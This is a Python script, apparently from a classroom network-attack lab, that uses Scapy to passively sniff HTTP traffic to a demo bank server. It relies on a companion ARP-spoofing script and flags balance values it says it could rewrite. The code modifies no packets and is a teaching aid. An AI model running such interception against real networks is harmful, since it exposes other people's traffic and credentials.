#!/usr/bin/env python3
"""
attacker/http_mitm.py
=====================

Step 4 of the attack chain — *passive* HTTP observation.

This script is deliberately read-only.  In a real engagement you would
proxy the connection, intercept the body, mutate it and re-encode it —
but doing that safely inside an unencrypted Scapy capture is fragile
(TCP sequence numbers, chunked encoding, keep-alive, etc.) and we do
not want a live demo to wedge itself half-way through a slide.

What it does instead
--------------------
* Sniffs every TCP segment on the lab interface, port 80 (or whatever
  --bank-port is set to).
* For each segment that contains a printable HTTP request or response,
  prints a coloured one-liner.
* When a response body contains the dollar-balance string we know the
  bank server returns, it shows the line "WOULD REWRITE: $1,000,000 ->
  $0.01" — proof to the class that we have the raw bytes in hand and
  could rewrite them if we chose to.

Pre-conditions
--------------
arp_spoof.py must be running so the victim's TCP/8088 traffic flows
through this host.  If you only run http_mitm.py you will see nothing.
"""

from __future__ import annotations

import argparse
import re
import signal
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from shared import config, colors                       # noqa: E402
from shared.network_utils import assert_lab_network, require_root  # noqa: E402

try:
    from scapy.all import IP, TCP, Raw, sniff           # type: ignore
except ImportError:
    colors.die("scapy is required: pip3 install scapy")


# Reused regex — compiled once, used per-packet.
BALANCE_RE = re.compile(rb"\$([0-9][0-9,]*)")
HTTP_REQ_RE = re.compile(rb"^(GET|POST|PUT|DELETE|HEAD) ")
HTTP_RESP_RE = re.compile(rb"^HTTP/1\.[01] ")

_stop = False


def short(s: bytes, n: int = 80) -> str:
    """Decode and truncate a byte blob for terminal-friendly logging."""
    text = s.decode("latin-1", errors="replace").replace("\r", "").replace("\n", " ")
    return text if len(text) <= n else text[:n] + "…"


def make_handler(victim_ip: str, bank_port: int) -> "callable":
    def handler(pkt) -> None:
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        ip = pkt[IP]
        tcp = pkt[TCP]
        data = bytes(pkt[Raw].load)

        # Only the bank port is in scope.  This keeps the demo output
        # focused — there will be SSH/DHCP/etc. noise on a typical VM.
        if tcp.sport != bank_port and tcp.dport != bank_port:
            return

        # Direction tag for nicer logs.
        if tcp.dport == bank_port:
            direction = f"{ip.src} -> bank:{bank_port}"
            tag = "REQ "
        else:
            direction = f"bank:{bank_port} -> {ip.dst}"
            tag = "RESP"

        if HTTP_REQ_RE.match(data):
            colors.info(f"{tag}  {direction}  {short(data)}")
        elif HTTP_RESP_RE.match(data):
            colors.info(f"{tag}  {direction}  {short(data)}")
            # Demonstrate that we could tamper with this body.
            match = BALANCE_RE.search(data)
            if match:
                stolen = match.group(0).decode()
                colors.step(
                    f"WOULD REWRITE balance {stolen} -> $0.01  "
                    f"(passive demo — no packet modified)"
                )
        # Anything else (mid-stream binary or empty ACKs) is ignored.
    return handler


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Passive HTTP observer for the lab bank traffic.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--iface",     default=config.DEFAULT_IFACE)
    p.add_argument("--victim",    default=config.VICTIM_IP)
    p.add_argument("--bank-port", type=int, default=config.BANK_PORT)
    return p.parse_args()


def main() -> None:
    args = parse_args()
    colors.banner("attacker/http_mitm.py", role="ATTACKER / HTTP OBSERVER")
    assert_lab_network(args.victim)
    require_root("attacker/http_mitm.py")

    colors.info(f"Watching TCP/{args.bank_port} on {args.iface}")
    colors.warn("Passive only — no packets are modified or dropped.")

    def _sig(signum, _frame):
        global _stop
        _stop = True
        colors.warn(f"Caught signal {signum} — stopping sniffer")
    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    sniff(
        iface=args.iface,
        # Kernel-side BPF: cheap, runs before Python sees anything.
        filter=f"tcp port {args.bank_port}",
        prn=make_handler(args.victim, args.bank_port),
        store=False,
        stop_filter=lambda _pkt: _stop,
    )
    colors.ok("HTTP observer stopped.")


if __name__ == "__main__":
    main()
